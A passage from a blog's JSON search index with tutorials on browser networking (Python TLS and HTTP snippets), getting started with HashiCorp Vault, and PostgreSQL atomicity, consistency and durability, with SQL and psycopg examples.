<li>Mozilla TLS Overview</li> </ul>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#python-code-for-tls-handshake","title":"Python Code for TLS Handshake:","text":"<pre><code>print(secure_sock.version())  # Print the TLS version used\n</code></pre>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#4-sending-an-http-request","title":"4. Sending an HTTP Request","text":"<p>Once connected, the browser sends an HTTP request. A standard request for Google\u2019s homepage:</p> <pre><code>GET / HTTP/1.1  \nHost: google.com  \nConnection: close  \nUser-Agent: Mozilla/5.0 (compatible; Chrome)\n</code></pre> <p>\ud83d\udd17 Official Docs:</p> <ul> <li>IETF RFC 7230 \u2014 HTTP/1.1 Message Syntax</li> <li>Mozilla HTTP Request Structure</li> </ul>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#python-code-for-sending-an-http-request","title":"Python Code for Sending an HTTP Request:","text":"<pre><code>request = \"GET / HTTP/1.1\\r\\nHost: google.com\\r\\nConnection: close\\r\\n\\r\\n\"  \nsecure_sock.sendall(request.encode())\n</code></pre>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#5-receiving-and-processing-the-response","title":"5. Receiving and Processing the Response","text":"<p>Google\u2019s server responds with an HTTP response, typically a 301 Redirect :</p> <pre><code>HTTP/1.1 301 Moved Permanently  \nLocation: https://www.google.com/\n</code></pre> <p>This instructs the browser to retry the request at <code>[https://www.google.com/](https://www.google.com/.)</code>.</p> <p>\ud83d\udd17 Official Docs:</p> <ul> <li>IETF RFC 9110 \u2014 HTTP Semantics</li> <li>Google HTTP Status Codes</li> </ul>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#python-code-for-receiving-response","title":"Python Code for Receiving Response:","text":"<pre><code>response = b\"\"  \nwhile True:  \n    data = secure_sock.recv(4096)  \n    if not data:  \n        break  \n    response += data  \nprint(response.decode(errors='ignore'))\n</code></pre>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#6-rendering-the-webpage","title":"6. Rendering the Webpage","text":"<p>Once the browser receives the response, it:</p> <ol> <li>Parses the HTML.</li> <li>Fetches additional resources (CSS, JavaScript, images).</li> <li>Executes scripts.</li> <li>Renders the page on the screen.</li> </ol> <p>\ud83d\udd17 Official Docs:</p> <ul> <li>MDN Browser Rendering</li> <li>Google Chrome Rendering Guide</li> </ul>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#7-handling-subsequent-requests-cookies-caching-cdn","title":"7. Handling Subsequent Requests (Cookies, Caching, CDN)","text":"<ul> <li>Cookies: The server might set authentication cookies.</li> <li>Caching: The browser stores assets for faster loading in future requests.</li> <li>CDN Requests: Additional requests might be sent to Google\u2019s CDN for assets.</li> </ul> <p>\ud83d\udd17 Official Docs:</p> <ul> <li>RFC 6265 \u2014 HTTP Cookies</li> <li>Google CDN Optimization</li> </ul>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#conclusion","title":"Conclusion","text":"<p>When you type <code>google.com</code> and press Enter, a series of sophisticated network processes occur, including DNS resolution, TCP/TLS handshakes, HTTP requests, and webpage rendering. Each step plays a critical role in delivering web pages securely and efficiently.</p>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#want-to-try-it-yourself","title":"Want to Try It Yourself?","text":"<p>Run the Python snippets above to see the process in action!</p> <p>By Kfir Gisman on March 30, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-04-15_---7-Quick-Tips-to-Get-Started-with-HashiCorp-Vault-9e56e42251bf/","title":"\ud83d\ude80 7 Quick Tips to Get Started with HashiCorp Vault","text":"<p>Learn how to master HashiCorp Vault with 7 practical tips- from core concepts to CLI tricks and Terraform integration. </p>"},{"location":"blog/old-blogs/2025-04-15_---7-Quick-Tips-to-Get-Started-with-HashiCorp-Vault-9e56e42251bf/#7-quick-tips-to-get-started-with-hashicorp-vault_1","title":"\ud83d\ude80 7 Quick Tips to Get Started with HashiCorp Vault","text":"<p>HashiCorp Vault is an incredibly powerful tool for managing secrets, access control, and sensitive data across your infrastructure. But to make the most of it, you need to understand both the theory and the tooling.</p> <p>Here are 7 tips to get you started- from the core mental model to using Vault in real-world projects with confidence.</p>"},{"location":"blog/old-blogs/2025-04-15_---7-Quick-Tips-to-Get-Started-with-HashiCorp-Vault-9e56e42251bf/#1-understand-the-vault-trust-flow","title":"\ud83e\udde0 1. Understand the Vault Trust Flow","text":"<p>Before touching the CLI, UI, or API, understand what Vault is actually doing under the hood.</p> <p>This image summarizes how Vault works:</p> <p></p> <ul> <li>On the left , users/services authenticate via cloud, GitHub, Kubernetes, etc.</li> <li>Vault sits in the center , evaluating policies and issuing credentials.</li> <li>On the right , secrets engines like AWS, SSH, databases, etc., return short-lived, scoped credentials.</li> </ul> <p>Vault isn\u2019t just a \u201ckey/value store\u201d- it\u2019s a dynamic identity broker. This diagram helps make sense of how everything connects.</p> <p>\ud83d\udd10 Once you get this flow, the rest of Vault will feel way more intuitive.</p>"},{"location":"blog/old-blogs/2025-04-15_---7-Quick-Tips-to-Get-Started-with-HashiCorp-Vault-9e56e42251bf/#2-understand-that-vault-is-path-based","title":"\ud83d\udcc2 2. Understand That Vault Is Path-Based","text":"<p>Vault\u2019s entire structure is path-centric:</p> <ul> <li>Secrets are stored at paths (e.g. <code>secret/myapp</code>)</li> <li>Policies are applied to paths</li> <li>Auth methods and secret engines are mounted at paths</li> </ul> <p>Think of it like a secure API-based filesystem. If you don\u2019t get the path right- or your policy doesn\u2019t cover it- you\u2019ll hit \u201cpermission denied\u201d walls all over the place (least privilege).</p> <p>\ud83e\udde9 Learning to reason in \u201cpaths\u201d is one of the fastest ways to level up with Vault.</p>"},{"location":"blog/old-blogs/2025-04-15_---7-Quick-Tips-to-Get-Started-with-HashiCorp-Vault-9e56e42251bf/#3-spin-up-vault-instantly-using-docker","title":"\ud83d\udc33 3. Spin Up Vault Instantly Using Docker","text":"<p>Now that you understand the core model, try it out locally. Vault offers a dev mode you can run in seconds using Docker:</p> <pre><code>docker run --cap-add=IPC_LOCK -e 'VAULT_DEV_ROOT_TOKEN_ID=root' -p 8200:8200 hashicorp/vault\n</code></pre> <p>You get:</p> <ul> <li>A running Vault server on <code>&lt;http://127.0.0.1:8200&gt;</code></li> <li>A root token (<code>root</code>) to authenticate</li> <li>No persistent storage (so it\u2019s safe for testing)</li> </ul> <p>Perfect for sandboxing features, learning, and scripting Vault workflows.</p>"},{"location":"blog/old-blogs/2025-04-15_---7-Quick-Tips-to-Get-Started-with-HashiCorp-Vault-9e56e42251bf/#4-use-output-curl-string-to-understand-api-calls","title":"\ud83e\uddea 4. Use <code>-output-curl-string</code> to Understand API Calls","text":"<p>When you use the Vault CLI, you can peek behind the scenes by adding:</p> <pre><code>-output-curl-string\n</code></pre> <p>This shows the exact <code>curl</code> command Vault would send via HTTP API:</p> <pre><code>vault kv get -output-curl-string secret/myapp\n</code></pre> <p>It\u2019s an amazing way to learn Vault\u2019s API while using the CLI- and great for debugging or scripting raw requests.</p>"},{"location":"blog/old-blogs/2025-04-15_---7-Quick-Tips-to-Get-Started-with-HashiCorp-Vault-9e56e42251bf/#5-use-the-cli-ui-and-api-depending-on-your-workflow","title":"\ud83e\udded 5. Use the CLI, UI, and API Depending on Your Workflow","text":"<p>Vault offers three ways to interact with it:</p> <ul> <li>CLI : Great for scripting and automation</li> <li>UI : Easy onboarding for newcomers and exploration</li> <li>API : Best for tight app integrations</li> </ul> <p>Each has its place. CLI and UI are great for development and ops. API is perfect for production use from apps.</p> <p>\ud83e\udde0 Mastering all three will make you comfortable in any Vault environment.</p>"},{"location":"blog/old-blogs/2025-04-15_---7-Quick-Tips-to-Get-Started-with-HashiCorp-Vault-9e56e42251bf/#6-dont-skip-the-docs-or-youtube","title":"\ud83d\udcda 6. Don\u2019t Skip the Docs (or YouTube)","text":"<p>Vault\u2019s official documentation is extremely well-written. No fluff \u2014 just solid, practical info with real-world examples.</p> <ul> <li>Vault Overview</li> <li>CLI Reference</li> <li>Hands-on Tutorials</li> </ul> <p>Want visuals? These two YouTube creators explain Vault better than most courses:</p> <ul> <li>\ud83c\udfa5 Rahul Wagh\u2019s Vault Playlist Watch on YouTube</li> <li>\ud83c\udfa5 TechWorld with Nana\u2019s Vault Intro  Watch on YouTube</li> </ul>"},{"location":"blog/old-blogs/2025-04-15_---7-Quick-Tips-to-Get-Started-with-HashiCorp-Vault-9e56e42251bf/#7-use-terraform-to-configure-vault","title":"\ud83c\udf31 7. Use Terraform to Configure Vault","text":"<p>Vault is a configuration-heavy system. Managing it manually? You\u2019ll hit walls fast.</p> <p>Use Terraform to:</p> <ul> <li>Enable and mount secrets engines</li> <li>Configure auth methods</li> <li>Create policies and roles</li> <li>Set up secret backends</li> </ul> <p>Codifying this config gives you version control, repeatability, and fewer mistakes. It\u2019s a best practice- especially for teams.</p> <p>Terraform Vault Provider</p> <p>\ud83e\uddf1 If you use Terraform for infrastructure, it\u2019s a no-brainer to extend it to Vault.</p>"},{"location":"blog/old-blogs/2025-04-15_---7-Quick-Tips-to-Get-Started-with-HashiCorp-Vault-9e56e42251bf/#wrapping-up","title":"\ud83c\udfaf Wrapping Up","text":"<p>Vault can be intimidating at first, but once you break it down into paths, flows, and automation- everything clicks into place.</p> <p>These 7 tips aim to give you a solid mental model , a working environment , and the best tools and resources to keep going.</p> <p>Feel free to fork, share, or leave questions. And if you\u2019ve got your own tips- send them my way!</p> <p>\u270d\ufe0f** Note** : This blog post was written and polished with the help of** ChatGPT** , used for grammar correction, structure, and adding emoji for clarity and style.</p> <p>By Kfir Gisman on April 15, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-05-12_Understanding-Atomicity-in-PostgreSQL--A-Deep-Dive-into-the--A--in-ACID-5bde6fd042e3/","title":"Understanding Atomicity in PostgreSQL: A Deep Dive into the \u201cA\u201d in ACID","text":"<p>Why atomicity matters: how PostgreSQL ensures all-or-nothing transactions and what can go wrong if you skip BEGIN </p>"},{"location":"blog/old-blogs/2025-05-12_Understanding-Atomicity-in-PostgreSQL--A-Deep-Dive-into-the--A--in-ACID-5bde6fd042e3/#understanding-atomicity-in-postgresql-a-deep-dive-into-the-a-in-acid_1","title":"Understanding Atomicity in PostgreSQL: A Deep Dive into the \u201cA\u201d in ACID","text":"<p>Photo by Thiago Matos : https://www.pexels.com/photo/orange-led-cfl-bulb-2338672/</p> <p>In production systems that manage critical data- whether financial transactions, user state, or infrastructure configuration- the integrity of state transitions is non-negotiable. That\u2019s where the ACID properties of relational databases come into play.</p> <p>This article takes a focused look at Atomicity , the first principle of ACID. We\u2019ll analyze how PostgreSQL enforces it, how failures are handled, and what engineers must understand to avoid subtle consistency bugs in real-world systems.</p>"},{"location":"blog/old-blogs/2025-05-12_Understanding-Atomicity-in-PostgreSQL--A-Deep-Dive-into-the--A--in-ACID-5bde6fd042e3/#what-atomicity-really-means","title":"What Atomicity Really Means","text":"<p>Atomicity guarantees that a transaction is all-or-nothing : every operation in the transaction either completes successfully, or none of them do. There is no concept of \u201cpartial success.\u201d</p> <p>Atomicity is enforced at the transaction level, not the statement level. PostgreSQL ensures that even if a failure occurs midway through a transaction, all previous operations in that transaction are automatically rolled back.</p> <p>For reference, see the official PostgreSQL Transaction Tutorial.</p>"},{"location":"blog/old-blogs/2025-05-12_Understanding-Atomicity-in-PostgreSQL--A-Deep-Dive-into-the--A--in-ACID-5bde6fd042e3/#a-simple-transfer-operation","title":"A Simple Transfer Operation","text":"<p>Consider a simplified banking example. We\u2019ll create an <code>accounts</code> table and simulate transferring funds between two accounts:</p> <pre><code>CREATE TABLE accounts (  \n    id SERIAL PRIMARY KEY,  \n    name TEXT NOT NULL,  \n    balance INTEGER NOT NULL CHECK (balance &gt;= 0)  \n);\n\nINSERT INTO accounts (name, balance)  \nVALUES ('Alice', 1000), ('Bob', 1000);\n</code></pre> <p>Now, we implement a basic transfer operation using an explicit transaction:</p> <pre><code>BEGIN;\n\nUPDATE accounts SET balance = balance - 200 WHERE name = 'Alice';  \nUPDATE accounts SET balance = balance + 200 WHERE name = 'Bob';\n\nCOMMIT;\n</code></pre> <p>If both statements succeed, the transaction is committed and both updates become permanent.</p>"},{"location":"blog/old-blogs/2025-05-12_Understanding-Atomicity-in-PostgreSQL--A-Deep-Dive-into-the--A--in-ACID-5bde6fd042e3/#simulating-a-failure","title":"Simulating a Failure","text":"<p>Now let\u2019s simulate an error that occurs in the second statement:</p> <pre><code>BEGIN;\n\nUPDATE accounts SET balance = balance - 200 WHERE name = 'Alice';  \n-- Intentional typo: column name is misspelled  \nUPDATE accounts SET balnce = balance + 200 WHERE name = 'Bob';\n\nCOMMIT;\n</code></pre> <p>PostgreSQL will raise an error:</p> <pre><code>ERROR: column \"balnce\" does not exist\n</code></pre> <p>At this point, the transaction is marked as failed. No further operations are allowed until a rollback is issued:</p> <pre><code>ROLLBACK;\n</code></pre> <p>Although the first <code>UPDATE</code> ran without error, its effect is discarded because the transaction was never successfully committed. This is atomicity in practice.</p>"},{"location":"blog/old-blogs/2025-05-12_Understanding-Atomicity-in-PostgreSQL--A-Deep-Dive-into-the--A--in-ACID-5bde6fd042e3/#what-if-you-dont-use-transactions","title":"What If You Don\u2019t Use Transactions?","text":"<p>When operations are issued individually without an explicit <code>BEGIN</code> block, PostgreSQL executes each as its own atomic unit:</p> <pre><code>UPDATE accounts SET balance = balance - 200 WHERE name = 'Alice';  \n-- This succeeds\n\nUPDATE accounts SET balnce = balance + 200 WHERE name = 'Bob';  \n-- This fails\n</code></pre> <p>Here, Alice\u2019s balance is reduced, but Bob never receives the funds. This violates our consistency requirements and results in data loss.</p> <p>Lesson: without explicit transactions, the database cannot enforce atomicity across multiple operations.</p>"},{"location":"blog/old-blogs/2025-05-12_Understanding-Atomicity-in-PostgreSQL--A-Deep-Dive-into-the--A--in-ACID-5bde6fd042e3/#statement-level-atomicity","title":"Statement-Level Atomicity","text":"<p>PostgreSQL does provide implicit transaction handling for single statements. If a single <code>INSERT</code>, <code>UPDATE</code>, or <code>DELETE</code> statement fails, it is discarded entirely and does not affect the database. However, for multiple operations that must succeed together, atomicity is not guaranteed unless you explicitly wrap them in a transaction.</p> <p>Relevant documentation: PostgreSQL BEGIN</p>"},{"location":"blog/old-blogs/2025-05-12_Understanding-Atomicity-in-PostgreSQL--A-Deep-Dive-into-the--A--in-ACID-5bde6fd042e3/#constraint-failures-and-runtime-errors","title":"Constraint Failures and Runtime Errors","text":"<p>PostgreSQL also enforces atomicity in the presence of constraint violations or other runtime errors. For example, suppose we enforce that balances cannot be negative:</p> <pre><code>ALTER TABLE accounts ADD CONSTRAINT non_negative_balance CHECK (balance &gt;= 0);\n</code></pre> <p>Then attempt:</p> <pre><code>BEGIN;\n\nUPDATE accounts SET balance = balance - 1100 WHERE name = 'Alice';  \nUPDATE accounts SET balance = balance + 1100 WHERE name = 'Bob';\n\nCOMMIT;\n</code></pre> <p>Alice only has 1000, so her balance would go negative. The first statement violates the constraint, and the entire transaction is aborted. No changes are applied.</p>"},{"location":"blog/old-blogs/2025-05-12_Understanding-Atomicity-in-PostgreSQL--A-Deep-Dive-into-the--A--in-ACID-5bde6fd042e3/#handling-transactions-in-application-code","title":"Handling Transactions in Application Code","text":"<p>Here\u2019s how atomicity works in a real-world PostgreSQL client using Python with psycopg3:</p> <pre><code>import psycopg\n\nconn = psycopg.connect(\"postgresql://user:pass@localhost/db\")\n\ntry:  \n    with conn.transaction():  \n        with conn.cursor() as cur:  \n            cur.execute(\"UPDATE accounts SET balance = balance - 200 WHERE name = 'Alice'\")  \n            cur.execute(\"UPDATE accounts SET balnce = balance + 200 WHERE name = 'Bob'\")  # Bug\n\nexcept Exception as e:  \n    print(f\"Transaction failed: {e}\")\n</code></pre> <p>In this case, <code>conn.transaction()</code> ensures that the entire block is treated as atomic. When the second query fails, psycopg3 automatically rolls back the transaction. No data is persisted.</p>"},{"location":"blog/old-blogs/2025-05-12_Understanding-Atomicity-in-PostgreSQL--A-Deep-Dive-into-the--A--in-ACID-5bde6fd042e3/#summary-of-cases","title":"Summary of Cases","text":"<ul> <li>Single<code>**UPDATE**</code>: Executed without an explicit transaction block, PostgreSQL treats it as an implicit transaction. It either succeeds or fails as a single atomic operation.</li> <li>Multiple<code>**UPDATE**</code>s without<code>**BEGIN**</code>: When multiple operations are issued individually without wrapping them in a transaction, atomicity is not guaranteed. If one statement succeeds and another fails, partial state changes can persist.</li> <li><code>**BEGIN**</code>/<code>**COMMIT**</code>with syntax or runtime error : When using an explicit transaction, any error- be it a syntax issue or constraint violation- causes the entire transaction to be rolled back. This ensures atomicity across all enclosed operations.</li> <li>Using psycopg3 with<code>**with conn.transaction()**</code>: In application code, using this context manager ensures atomicity. If any exception is raised during the block, psycopg3 automatically rolls back the transaction.</li> </ul>"},{"location":"blog/old-blogs/2025-05-12_Understanding-Atomicity-in-PostgreSQL--A-Deep-Dive-into-the--A--in-ACID-5bde6fd042e3/#final-thoughts","title":"Final Thoughts","text":"<p>PostgreSQL provides strong atomicity guarantees, but they\u2019re only effective when transactions are used intentionally and correctly. Multi-statement operations should always be wrapped in an explicit transaction, and developers must anticipate rollback paths as part of the application\u2019s normal flow.</p> <p>Failing to do so can result in partial writes, corrupted state, and long-tail data integrity bugs that are difficult to trace.</p> <p>For more details, refer to the official documentation:</p> <ul> <li>PostgreSQL Transactions</li> <li>BEGIN</li> <li>COMMIT</li> <li>ROLLBACK</li> <li>psycopg3 Transactions</li> </ul> <p>By Kfir Gisman on May 12, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-06-01_Understanding-Consistency-in-PostgreSQL--A-Deep-Dive-into-the--C--in-ACID-82ed2d1093ec/","title":"Understanding Consistency in PostgreSQL: A Deep Dive into the \u201cC\u201d in ACID","text":"<p>How PostgreSQL keeps your data safe from logical errors using constraints, triggers, and transactional rules </p>"},{"location":"blog/old-blogs/2025-06-01_Understanding-Consistency-in-PostgreSQL--A-Deep-Dive-into-the--C--in-ACID-82ed2d1093ec/#understanding-consistency-in-postgresql-a-deep-dive-into-the-c-in-acid_1","title":"Understanding Consistency in PostgreSQL: A Deep Dive into the \u201cC\u201d in ACID","text":"<p>Photo by Matheus Viana: https://www.pexels.com/photo/orange-wall-and-sitting-boy-10216566/</p> <p>In systems where data correctness is non-negotiable- whether you\u2019re handling user authentication, e-commerce inventory, or hospital patient records- Consistency is the invisible guardrail that ensures the rules of your domain are never broken.</p> <p>This article explores Consistency , the second principle of ACID. We\u2019ll walk through how PostgreSQL enforces it via constraints, how violations are handled, and what developers need to be mindful of to avoid state corruption in real-world systems.</p>"},{"location":"blog/old-blogs/2025-06-01_Understanding-Consistency-in-PostgreSQL--A-Deep-Dive-into-the--C--in-ACID-82ed2d1093ec/#what-consistency-really-means","title":"What Consistency Really Means","text":"<p>Consistency ensures that a transaction brings the database from one valid state to another. That means all defined constraints, rules, and invariants must be satisfied before and after every transaction.</p> <p>If any part of a transaction would leave the data in an invalid state, PostgreSQL rejects the entire transaction- not just the failing statement-preserving the integrity of your system.</p>"},{"location":"blog/old-blogs/2025-06-01_Understanding-Consistency-in-PostgreSQL--A-Deep-Dive-into-the--C--in-ACID-82ed2d1093ec/#a-schema-with-invariants","title":"A Schema With Invariants","text":"<p>Let\u2019s return to our simple banking system and define some rules we want PostgreSQL to enforce:</p> <pre><code>CREATE TABLE accounts (  \n    id SERIAL PRIMARY KEY,  \n    name TEXT NOT NULL,  \n    balance INTEGER NOT NULL CHECK (balance &gt;= 0),  \n    UNIQUE(name)  \n);\n</code></pre> <p>Here, we\u2019ve defined:</p> <ul> <li>Every account must have a non-null name.</li> <li>Balances must be zero or greater.</li> <li>Names must be unique.</li> </ul> <p>These are declarative constraints. PostgreSQL uses them to guarantee that no transaction can violate your domain rules.</p>"},{"location":"blog/old-blogs/2025-06-01_Understanding-Consistency-in-PostgreSQL--A-Deep-Dive-into-the--C--in-ACID-82ed2d1093ec/#violating-consistency-with-a-bad-transaction","title":"Violating Consistency with a Bad Transaction","text":"<p>Say Alice tries to transfer more than she has:</p> <pre><code>BEGIN;\n\nUPDATE accounts SET balance = balance - 1200 WHERE name = 'Alice';  \nUPDATE accounts SET balance = balance + 1200 WHERE name = 'Bob';\n\nCOMMIT;\n</code></pre> <p>If Alice only has 1000, PostgreSQL will raise:</p> <pre><code>ERROR:  new row for relation \"accounts\" violates check constraint \"accounts_balance_check\"\n</code></pre> <p>At this point, the transaction is marked as failed and must be rolled back:</p> <pre><code>ROLLBACK;\n</code></pre> <p>Result : No changes are applied. This is Consistency at work- the integrity rule (<code>balance &gt;= 0</code>) was violated, so PostgreSQL refused to apply any part of the transaction.</p>"},{"location":"blog/old-blogs/2025-06-01_Understanding-Consistency-in-PostgreSQL--A-Deep-Dive-into-the--C--in-ACID-82ed2d1093ec/#enforcing-business-logic-with-triggers","title":"Enforcing Business Logic with Triggers","text":"<p>Not all rules are easily encoded as column constraints. For more complex logic- like age-based restrictions or cross-table validations- we can use triggers.</p> <p>Example: prevent creating users under age 18.</p> <pre><code>CREATE OR REPLACE FUNCTION check_age()  \nRETURNS TRIGGER AS $$  \nBEGIN  \n    IF NEW.age &lt; 18 THEN  \n        RAISE EXCEPTION 'Age must be at least 18';  \n    END IF;  \n    RETURN NEW;  \nEND;  \n$$ LANGUAGE plpgsql;\n\nCREATE TRIGGER check_age_trigger  \nBEFORE INSERT OR UPDATE ON users  \nFOR EACH ROW  \nEXECUTE FUNCTION check_age();\n</code></pre> <p>Now, any <code>INSERT</code> or <code>UPDATE</code> that violates this rule will automatically fail, and the transaction will be rolled back- keeping the system in a consistent state.</p>"},{"location":"blog/old-blogs/2025-06-01_Understanding-Consistency-in-PostgreSQL--A-Deep-Dive-into-the--C--in-ACID-82ed2d1093ec/#referential-integrity-via-foreign-keys","title":"Referential Integrity via Foreign Keys","text":"<p>Let\u2019s introduce a <code>transactions</code> table that logs money transfers:</p> <pre><code>CREATE TABLE transactions (  \n    id SERIAL PRIMARY KEY,  \n    from_account INTEGER REFERENCES accounts(id),  \n    to_account INTEGER REFERENCES accounts(id),  \n    amount INTEGER NOT NULL CHECK (amount &gt; 0)  \n);\n</code></pre> <p>PostgreSQL ensures that both <code>from_account</code> and <code>to_account</code> actually exist. Attempting to insert a transaction for a non-existent account will fail immediately.</p> <pre><code>INSERT INTO transactions (from_account, to_account, amount)  \nVALUES (999, 2, 100);\n\n\nERROR:  insert or update on table \"transactions\" violates foreign key constraint\n</code></pre> <p>That\u2019s PostgreSQL maintaining consistency via referential integrity.</p>"},{"location":"blog/old-blogs/2025-06-01_Understanding-Consistency-in-PostgreSQL--A-Deep-Dive-into-the--C--in-ACID-82ed2d1093ec/#consistency-in-application-code-python-psycopg3","title":"Consistency in Application Code (Python + psycopg3)","text":"<p>Here\u2019s how consistency violations behave in real-world application code:</p> <pre><code>import psycopg\n\nconn = psycopg.connect(\"postgresql://user:pass@localhost/db\")\n\ntry:  \n    with conn.transaction():  \n        with conn.cursor() as cur:  \n            cur.execute(\"UPDATE accounts SET balance = balance - 1200 WHERE name = 'Alice'\")  \n            cur.execute(\"UPDATE accounts SET balance = balance + 1200 WHERE name = 'Bob'\")\n\nexcept Exception as e:  \n    print(f\"Transaction failed: {e}\")\n</code></pre> <p>If the <code>balance - 1200</code> fails the <code>CHECK</code> constraint, the entire block is rolled back. You\u2019ll never end up in a partial state where Alice lost money but Bob gained nothing.</p>"},{"location":"blog/old-blogs/2025-06-01_Understanding-Consistency-in-PostgreSQL--A-Deep-Dive-into-the--C--in-ACID-82ed2d1093ec/#summary-of-cases","title":"Summary of Cases","text":"<ul> <li>Constraint violations : Cause immediate rollback of the entire transaction.</li> <li>Triggers : Allow custom rules that extend beyond column-level checks.</li> <li>Foreign key violations : Prevent inconsistent references between tables.</li> <li>Application-level transactions : <code>psycopg3</code> ensures that rule violations bubble up cleanly, triggering a rollback.</li> </ul>"},{"location":"blog/old-blogs/2025-06-01_Understanding-Consistency-in-PostgreSQL--A-Deep-Dive-into-the--C--in-ACID-82ed2d1093ec/#final-thoughts","title":"Final Thoughts","text":"<p>Consistency is the safety net that protects your data from logical corruption. PostgreSQL\u2019s constraint system- combined with triggers and foreign keys- ensures that your application\u2019s data model is always honored.</p> <p>If you\u2019re building systems where correctness matters, you must treat consistency as a first-class design concern. Don\u2019t rely on application code alone to enforce business rules- declarative constraints and transactional integrity are your best allies.</p> <p>Further Reading:</p> <ul> <li>PostgreSQL Constraints</li> <li>PostgreSQL Foreign Keys</li> <li>Triggers</li> <li>psycopg3 Transactions</li> </ul> <p>By Kfir Gisman on June 1, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Durability-in-PostgreSQL--A-Deep-Dive-into-the--D--in-ACID-af42ce13fb2b/","title":"Understanding Durability in PostgreSQL -A Deep Dive into the \u201cD\u201d in ACID","text":"<p>When you hit COMMIT, is your data really safe? See how PostgreSQL uses WAL to guarantee Durability- the \u2018D\u2019 in ACID </p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Durability-in-PostgreSQL--A-Deep-Dive-into-the--D--in-ACID-af42ce13fb2b/#understanding-durability-in-postgresql-a-deep-dive-into-the-d-in-acid_1","title":"Understanding Durability in PostgreSQL -A Deep Dive into the \u201cD\u201d in ACID","text":"<p>Photo by Matheus Viana: https://www.pexels.com/photo/person-on-bike-2372972/</p> <p>So far in this series, we\u2019ve looked at how PostgreSQL handles Atomicity, Consistency, and Isolation. But what happens after you commit a transaction? What if the power goes out, the server crashes, or someone trips over the plug?</p> <p>This is where Durability , the final letter in ACID, comes in. Durability means that once a transaction is committed, it will not be lost- no matter what.</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Durability-in-PostgreSQL--A-Deep-Dive-into-the--D--in-ACID-af42ce13fb2b/#what-does-durability-really-mean","title":"What Does Durability Really Mean?","text":"<p>In practical terms, Durability means that when your application gets a <code>COMMIT</code> confirmation, the data is safely stored and recoverable even if the database crashes immediately afterward.</p> <p>PostgreSQL achieves this with its Write-Ahead Logging (WAL) mechanism. Instead of immediately rewriting table files on disk, PostgreSQL writes changes to a log file first. If the system crashes, PostgreSQL can replay this log to get back to a consistent state.</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Durability-in-PostgreSQL--A-Deep-Dive-into-the--D--in-ACID-af42ce13fb2b/#how-does-wal-work","title":"How Does WAL Work?","text":"<p>Here\u2019s the basic flow:</p> <ol> <li>You run a transaction that changes some data.</li> <li>PostgreSQL writes the changes to the WAL file on disk.</li> <li>Only after the WAL record is safely on disk does PostgreSQL acknowledge the <code>COMMIT</code>.</li> </ol> <p>So the WAL acts like a black box flight recorder for your database.</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Durability-in-PostgreSQL--A-Deep-Dive-into-the--D--in-ACID-af42ce13fb2b/#lets-see-durability-in-action","title":"Let\u2019s See Durability in Action","text":"<p>You can see WAL files in action in your data directory. Here\u2019s a simple demo.</p> <p>First, check your WAL settings:</p> <pre><code>SHOW wal_level;  \nSHOW synchronous_commit;\n</code></pre> <p>By default, <code>synchronous_commit</code> is <code>on</code>. This means PostgreSQL waits until WAL changes are flushed to disk before confirming the commit.</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Durability-in-PostgreSQL--A-Deep-Dive-into-the--D--in-ACID-af42ce13fb2b/#test-crash-recovery-safe-experiment","title":"Test: Crash Recovery (Safe Experiment)","text":"<p>Let\u2019s simulate how WAL protects your data.</p> <ol> <li> <p>Create a test table:</p> <p>CREATE TABLE durability_test (id SERIAL PRIMARY KEY, data TEXT);</p> </li> </ol> <p>2. Insert some rows and commit:</p> <pre><code>INSERT INTO durability_test (data) VALUES ('Important Data 1'), ('Important Data 2'); COMMIT;\n</code></pre> <p>3. Now, force PostgreSQL to checkpoint to flush data to disk:</p> <pre><code>CHECKPOINT;\n</code></pre> <p>4. If the server crashes after the WAL is written but before data files are updated, PostgreSQL will replay the WAL on startup to make sure your rows are still there.</p> <p>Of course, don\u2019t yank the power cord \u2014 but you can trust that WAL would restore the committed rows.</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Durability-in-PostgreSQL--A-Deep-Dive-into-the--D--in-ACID-af42ce13fb2b/#when-durability-can-be-tuned","title":"When Durability Can Be Tuned","text":"<p>Sometimes, applications may want to trade off strict Durability for speed. For example, you can turn off <code>synchronous_commit</code>:</p> <pre><code>SET synchronous_commit = off;\n</code></pre> <p>Now PostgreSQL can acknowledge a commit before the WAL is flushed to disk. If the server crashes immediately, you could lose the last few transactions.</p> <p>This is faster but obviously less durable \u2014 so use it only when you\u2019re okay with that risk (like bulk loads or cache tables).</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Durability-in-PostgreSQL--A-Deep-Dive-into-the--D--in-ACID-af42ce13fb2b/#real-world-takeaway","title":"Real-World Takeaway","text":"<p>Durability is what lets you sleep at night knowing your committed data won\u2019t vanish. PostgreSQL\u2019s WAL and crash recovery have been battle-tested for decades. As long as you keep your WAL files safe (and your disks healthy), your data stays safe 